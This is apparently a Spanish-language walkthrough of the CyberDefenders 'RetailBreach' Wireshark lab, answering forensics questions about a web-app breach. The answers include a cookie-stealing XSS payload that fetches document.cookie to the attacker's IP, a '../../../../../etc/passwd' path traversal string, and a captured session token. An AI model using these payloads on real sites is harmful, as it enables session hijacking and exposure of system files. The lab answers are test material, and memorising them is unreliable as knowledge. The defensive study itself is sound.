- --
- Tags: #wireshark #cyberdefenders #retailbreach_lab
- --
Identificar la dirección IP de un atacante es crucial para mapear la magnitud del ataque y planificar una respuesta eficaz. ¿Cuál es la dirección IP del atacante?
![Pasted image 20260630173502](../../Fotos/Pasted%20image%2020260630173502.png)
111.224.180.128

El atacante utilizaba una herramienta de fuerza bruta de directorios para descubrir rutas ocultas. ¿Qué herramienta usó el atacante para realizar la fuerza bruta?
![Pasted image 20260630173819](../../Fotos/Pasted%20image%2020260630173819.png)

![Pasted image 20260630175856](../../Fotos/Pasted%20image%2020260630175856.png)

![Pasted image 20260630175825](../../Fotos/Pasted%20image%2020260630175825.png)
Gobuster

El Cross-Site Scripting (XSS) permite a los atacantes inyectar scripts maliciosos en páginas web vistas por los usuarios. ¿Puedes especificar la carga útil XSS que el atacante usó para comprometer la integridad de la aplicación web?
![Pasted image 20260630180915](../../Fotos/Pasted%20image%2020260630180915.png)

![Pasted image 20260630181051](../../Fotos/Pasted%20image%2020260630181051.png)

![Pasted image 20260630181105](../../Fotos/Pasted%20image%2020260630181105.png)
`<script>fetch('http://111.224.180.128/' + document.cookie);</script>`

Determinar el momento exacto en que un usuario administrador se encuentra con el script malicioso inyectado es crucial para entender la cronología de una brecha de seguridad. ¿Puedes proporcionar la marca de tiempo UTC cuando el usuario administrador visitó por primera vez la página que contiene el script malicioso inyectado?
![Pasted image 20260630182039](../../Fotos/Pasted%20image%2020260630182039.png)
2024-03-29 12:09

El robo de un token de sesión a través de XSS supone una grave brecha de seguridad que permite el acceso no autorizado. ¿Puedes proporcionar el token de sesión que el atacante adquirió y utilizó para este acceso no autorizado?
![Pasted image 20260630182308](../../Fotos/Pasted%20image%2020260630182308.png)

![Pasted image 20260630182244](../../Fotos/Pasted%20image%2020260630182244.png)
lqkctf24s9h9lg67teu8uevn3q

Identificar qué scripts han sido explotados es crucial para mitigar vulnerabilidades en una aplicación web. ¿Cuál es el nombre del script que fue explotado por el atacante?
![Pasted image 20260630183635](../../Fotos/Pasted%20image%2020260630183635.png)
log_viewer.php

Explotar vulnerabilidades para acceder a archivos sensibles del sistema es una táctica común utilizada por los atacantes. ¿Puedes identificar la carga útil específica que usó el atacante para acceder a un archivo sensible del sistema?
![Pasted image 20260630184649](../../Fotos/Pasted%20image%2020260630184649.png)
../../../../../etc/passwd

